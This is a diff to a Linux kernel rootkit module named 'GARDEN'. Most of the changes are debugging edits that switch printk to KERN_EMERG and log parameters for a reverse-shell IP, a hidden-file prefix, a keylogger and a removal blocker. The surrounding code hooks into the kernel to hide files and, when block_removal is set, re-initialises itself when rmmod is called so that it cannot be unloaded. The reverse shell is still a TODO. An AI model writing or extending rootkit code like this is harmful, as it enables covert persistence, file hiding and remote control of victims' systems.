@@ -45,7 +45,7 @@ typedef struct commands {
  * Global defines and variables.
  */
 
-#define POLLING_INTERVAL 300
+#define POLLING_INTERVAL 1500
 static _timer polling_timer;
 struct commands cmds;
 
@@ -85,7 +85,7 @@ static void poll_for_commands(unsigned long data);
  */
 
 void log_info(const char *message) {
-    printk(KERN_INFO "%s %s", "GARDEN:", message);
+    printk(KERN_EMERG "GARDEN: %s", message);
 }
 
 void log_error(const char *message) {
@@ -101,7 +101,7 @@ void log_error(const char *message) {
  * If this method returns true, the file in question should be hidden.
  */
 static bool should_hide_file(const char *name) {
-    printk(KERN_INFO "Determining if should hide: %s\n", name);
+    printk(KERN_EMERG "Determining if should hide: %s\n", name);
     if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
         return true;
     }
@@ -205,9 +205,14 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  */
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
-    //printk(KERN_INFO "Polling for commands!\n");
+    log_info("Polling for commands!\n");
+	printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
+	printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
+	printk(KERN_EMERG "block_removal: %d", block_removal);
+	printk(KERN_EMERG "keylogger enabled: %d", keylogger);
+
     if (rev_shell_ip != cmds.rev_shell_ip) {
-        printk(KERN_INFO "rev_shell_ip updated: %s\n", rev_shell_ip);
+        printk(KERN_EMERG "rev_shell_ip updated: %s\n", rev_shell_ip);
         cmds.rev_shell_ip = rev_shell_ip;
         // TODO: Set up reverse shell.
     }
@@ -228,13 +233,13 @@ static void copy_params_into_cmd_struct(commands *cmd) {
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "Initializing rootkit...\n");
+    printk(KERN_EMERG "Initializing rootkit...\n");
     khook_init();
 
-    printk(KERN_INFO "Reading parameters...\n");
+    printk(KERN_EMERG "Reading parameters...\n");
     copy_params_into_cmd_struct(&cmds);
 
-    printk(KERN_INFO "Initializing timer...\n");
+    printk(KERN_EMERG "Initializing timer...\n");
     timer_init_wrapper(&polling_timer, poll_for_commands);
     set_timer(&polling_timer);
 
@@ -249,9 +254,9 @@ static int __init rootkit_init(void) {
  * the rootkit is cleaned up nicely.
  */
 static void __exit rootkit_exit(void) {
-	printk(KERN_INFO "rmmod called. Cleaning up rootkit.");
+	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
 	if (block_removal) {
-		printk(KERN_INFO "Just kidding. This sounds like a good time to reinstall your OS.");
+		printk(KERN_EMERG "Just kidding. This sounds like a good time to reinstall your OS.");
 		rootkit_init();
 	} else {
 		khook_cleanup();
